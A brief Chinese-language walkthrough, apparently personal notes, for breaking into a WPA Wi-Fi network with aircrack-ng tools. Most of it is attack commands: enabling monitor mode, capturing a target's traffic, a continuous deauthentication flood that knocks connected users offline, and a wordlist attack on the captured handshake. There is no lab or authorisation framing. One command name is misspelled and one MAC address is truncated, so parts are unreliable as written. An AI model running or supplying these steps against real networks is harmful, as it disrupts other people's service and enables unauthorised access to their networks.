1.使用iwconfig命令查看网卡信息

iwconfig 

2.设置wlan0为监听模式

sudo arimon-ng start wlan0

3.监听wifi信道

sudo airodump-ng wlan0

ctrl+c 暂停记录BSSID及信道CH对应的数字

4.单独监听某个wifi

sudo airodump-ng wlan0 -d DC:C6:4B:81:6A:FE #BSSID

5.监听并设置保存数据包的名称

sudo airodump-ng -w hack -c 3 --bssid DC:C6:4B:6A:FE wlan0

6.新开窗口，炸掉wifi，当前连接该wifi的用户下线

sudo aireplay-ng --deauth 0 -a DC:C6:4B:81:6A:FE wlan0

7.ctrl+c停止运行（如果不暂停，别人无法连接wifi）

8.检查数据包数据是否可用

wireshark hack-01.cap #新开一个软件工具 

输入eapol

9.破解密码

aircrack-ng hack-01.cap -w /usr/share/wordlists/rockyou.txt #从文件字典中读取密码

进行测试。如果连接成功回显密码。











